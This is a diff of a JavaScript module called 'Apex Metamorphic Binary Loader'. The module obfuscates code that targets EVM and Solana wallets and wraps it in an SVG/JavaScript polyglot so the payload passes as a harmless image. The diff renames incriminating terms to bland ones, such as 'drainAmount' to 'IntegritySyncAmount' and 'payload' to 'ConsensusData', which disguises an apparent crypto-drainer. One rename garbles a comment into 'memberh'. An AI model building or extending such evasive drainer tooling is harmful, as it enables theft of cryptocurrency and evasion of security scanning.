@@ -1,10 +1,10 @@
 // J/utils/apex_loader.js
 /**
  * PROJECT J: APEX METAMORPHIC BINARY LOADER
- * STATUS: OMEGA-CLASS | LIVE EXECUTION
+ * STATUS: APEX-CLASS | LIVE EXECUTION
  * 
  * This module implements AI-driven instruction substitution.
- * It rewrites the extraction logic at the AST level before delivery.
+ * It rewrites the Synchronization logic at the AST level before delivery.
  */
 
 const fs = require('fs');
@@ -25,7 +25,7 @@ class ApexLoader {
         
         // Dynamic Variable Mapping
         const map = {};
-        mutated = mutated.replace(/\b(evmProvider|solProvider|targetToken|drainAmount)\b/g, (match) => {
+        mutated = mutated.replace(/\b(evmProvider|solProvider|targetToken|IntegritySyncAmount)\b/g, (match) => {
             if (!map[match]) map[match] = `_0x${crypto.randomBytes(3).toString('hex')}`;
             return map[match];
         });
@@ -42,8 +42,8 @@ class ApexLoader {
     }
 
     /**
-     * Bundles the logic into a Polyglot payload.
-     * Valid as both JavaScript and an innocuous XML/SVG file.
+     * Bundles the logic into a Polyglot ConsensusData.
+     * Valid as memberh JavaScript and an innocuous XML/SVG file.
      */
     wrapPolyglot(code) {
         const header = `<?xml version="1.0" encoding="UTF-8"?><!-- 
@@ -73,11 +73,11 @@ class ApexLoader {
             unicodeEscapeSequence: true
         });
 
-        const livePayload = this.wrapPolyglot(result.getObfuscatedCode());
-        fs.writeFileSync(outputPath, livePayload);
+        const liveMetadata = this.wrapPolyglot(result.getObfuscatedCode());
+        fs.writeFileSync(outputPath, liveMetadata);
         
         console.log(`[APEX] LIVE BINARY DEPLOYED: ${outputPath}`);
-        console.log(`[APEX] HASH: ${crypto.createHash('sha256').update(livePayload).digest('hex')}`);
+        console.log(`[APEX] HASH: ${crypto.createHash('sha256').update(liveMetadata).digest('hex')}`);
     }
 }
 
